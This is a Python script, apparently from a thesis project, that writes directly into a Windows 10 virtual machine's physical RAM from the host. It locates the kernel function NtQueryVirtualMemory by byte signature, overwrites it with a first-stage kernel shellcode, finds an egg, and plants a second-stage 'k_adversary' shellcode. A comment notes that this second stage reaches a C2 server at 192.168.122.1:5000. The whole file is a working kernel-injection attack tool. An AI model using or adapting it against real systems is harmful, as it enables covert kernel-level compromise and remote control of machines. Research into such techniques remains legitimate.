import ctypes
import time


def read_shmem(shmem_so: ctypes.CDLL, dev_shm_file: str, address: int, length: int):
    write_data = None
    dev_shm_file = ctypes.create_string_buffer(dev_shm_file.encode())
    read_data = ctypes.create_string_buffer(length)
    res = shmem_so.do_shmem(dev_shm_file, address, length, read_data, write_data)
    if res != 0:
        print(f"Error code: {res}")
    return read_data


def write_shmem(shmem_so: ctypes.CDLL, dev_shm_file: str, address: int, length: int, write_data: bytes):
    write_data = ctypes.create_string_buffer(write_data)
    dev_shm_file = ctypes.create_string_buffer(dev_shm_file.encode())
    read_data = ctypes.create_string_buffer(length)
    res = shmem_so.do_shmem(dev_shm_file, address, length, read_data, write_data)
    if res != 0:
        print(f"Error code: {res}")
    return read_data


def init_shmem_wrapper(so_file):
    shmem = ctypes.CDLL(so_file)
    shmem.do_shmem.restype = ctypes.c_int
    shmem.do_shmem.argtypes = [ctypes.c_char_p, ctypes.c_size_t, ctypes.c_size_t, ctypes.c_char_p]
    return shmem


def inject_shellcode(shmem, dev_shm_filename, addr, shellcode, sleep_time=5):
    orig_data = write_shmem(shmem, dev_shm_filename, addr, len(shellcode), shellcode)
    print("Shellcode written to system call handler")
    time.sleep(sleep_time)
    write_shmem(shmem, dev_shm_filename, addr, len(orig_data.raw), orig_data.raw)
    print("Restored original system call handler")


def search_physical(virtual_address, page_offset, expected_bytes, shmem, dev_shm_filename, ram_size=2147483648, debug=False):
    # virtual_address is only for visualization
    # we step by 0x1000 (4 KB) because it's the min alignment, then add the offset
    found = False
    page_offset = page_offset % 0x1000
    # page_offset = virtual_address & (0x1000 - 1)
    addr = 0
    for addr in range(0, ram_size, 0x1000):
        read_data = read_shmem(shmem, dev_shm_filename, addr+page_offset, len(expected_bytes))
        if debug:
            print(read_data.raw)
            print(expected_bytes)
            print("Continue? (y/n)")
            choice = input()
            if choice != 'y':
                break
        if read_data.raw == expected_bytes:
            found = True
            addr = addr + page_offset
            break
    if found:
        if virtual_address != 0:
            print("Address found!")
            print(f"{hex(virtual_address)} is {hex(addr)}")
        else:
            print("Egg found!")
            print(f"Egg is located at {hex(addr)}")
        return addr
    else:
        print("Address not found, maybe bad page_offset or bad expected_bytes for specified Windows version")
        return None


if __name__ == "__main__":
    so_file = "/home/marcofelix98/tesi_m63/devmem2/shmem2.so"
    dev_shm_ram = "/dev/shm/3-win10-3/pc.ram"
    shmem = init_shmem_wrapper(so_file)
    # demo
    """
    read_data = read_shmem(shmem, dev_shm_ram, 0x0, 8)
    # to_hex reverses bytes, like interpreting a value as an integer
    to_hex = lambda s: "0x" + "".join(["{:02x}".format(i).upper() for i in s][::-1])
    # using .raw because .value stops at null bytes
    print(read_data.raw)
    print(to_hex(read_data.raw))

    write_data = b'\xDE\xAD'[::-1]
    orig_data = write_shmem(shmem, dev_shm_ram, 0x0, 2, write_data)
    print(to_hex(orig_data.raw))

    read_data = write_shmem(shmem, dev_shm_ram, 0x0, 2, orig_data.raw)
    print(to_hex(read_data.raw))

    read_data = read_shmem(shmem, dev_shm_ram, 0x0, 2)
    print(to_hex(read_data.raw))

    # bytes of SYSTEM process, compare with db(addr) in volshell using virtual addresss
    read_data = read_shmem(shmem, dev_shm_ram, 0x7e069080, 64)
    print(read_data.raw)
    """
    # PATCH the kernel-shellcodes with the right ntoskrnl base address before running this
    # BE SURE you have a C2 server listening on 192.168.122.1:5000 reachable from VM or PATCH IP and port in second-stage shellcode

    print('[+] Searching NtQueryVirtualMemory physycal address')

    # search NtQueryVirtualMemory physical offset, with virtual address from windows.ssdt
    expected_bytes = b"\x48\x83\xec\x48\x48\x8b\x44\x24\x78\xc7\x44\x24\x30\x02\x00\x00\x00\x48\x89\x44\x24\x28\x48\x8b\x44\x24\x70\x48\x89\x44\x24\x20\xe8\x1b\x00\x00\x00\x48\x83\xc4\x48\xc3\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\x4c\x8b\xdc\x53\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x81\xec\x70\x01\x00\x00\x48\x8b\x05\xa4\x49\x5b\x00\x48\x33\xc4\x48\x89\x84\x24\x60\x01\x00\x00\x4d\x8b\xe1\x4c\x89\x8c\x24\xf8\x00\x00\x00\x45\x8b\xf0\x44\x89\x84\x24\xc8\x00\x00\x00\x48\x89\x54\x24\x58\x48\x8b\xf9\x48\x8b\x84\x24\xd8\x01\x00\x00\x48\x89\x44\x24\x50\x33\xc9\x89\x4c\x24\x48\x48\x89\x4c\x24\x70\x49\x89\x8b\x38\xff\xff\xff\x0f\x57\xc0\x0f\x11\x84\x24\x80\x00\x00\x00\x0f\x11\x84\x24\x90\x00\x00\x00\x0f\x11\x84\x24\xa0\x00\x00\x00\x33\xc0\x0f\x11\x84\x24\xb0\x00\x00\x00\x49\x89\x83\x18\xff\xff\xff\x0f\x57\xc9\x41\x0f\x11\x4b\x88\x41\x0f\x11\x4b\x98\x41\x0f\x11\x4b\xa8\x89\x4c\x24\x40\x48\x89\x8c\x24\xd8\x00\x00\x00\x48\x89"
    # CHANGE THIS virtual_addr, needed for page_offset
    virtual_addr = 0xf80625c748e0
    page_offset = virtual_addr & 0x0fff
    phys_addr = search_physical(virtual_addr, page_offset, expected_bytes, shmem, dev_shm_ram, debug=False)
    MmQueryVirtualMemory = phys_addr + 64

    print('[+] Injecting first stage shellcode')

    # shellcode = b"\xcc\xc3"
    with open("../kernel_shellcode_library/modified_first_stage_with_egg_and_system_thread.bin", 'rb') as f:
        shellcode = f.read()
    # inject_shellcode(shmem, dev_shm_ram, MmQueryVirtualMemory, shellcode, sleep_time=30)
    orig_data = write_shmem(shmem, dev_shm_ram, MmQueryVirtualMemory, len(shellcode), shellcode)

    time.sleep(10)

    print('[+] Searching egg')

    egg = bytes.fromhex('30f79746705547e3a625b82dccab2f3e560a710098e44da7981d45f0af83506d')
    second_stage_loc = search_physical(0, 0, egg, shmem, dev_shm_ram, debug=False)

    print('[+] Injecting second stage shellcode')

    with open("../kernel_shellcode_library/modified_k_adversary_as_system_thread.bin", 'rb') as f:
        second_stage_shellcode = f.read()

    # breakpoint prefix, for debug only
    # second_stage_shellcode = b"\xcc" + second_stage_shellcode

    write_shmem(shmem, dev_shm_ram, second_stage_loc, len(second_stage_shellcode), second_stage_shellcode)

    time.sleep(10)

    print('[+] Restoring first-stage area')

    write_shmem(shmem, dev_shm_ram, MmQueryVirtualMemory, len(orig_data.raw), orig_data.raw)

    print('[+] Done')
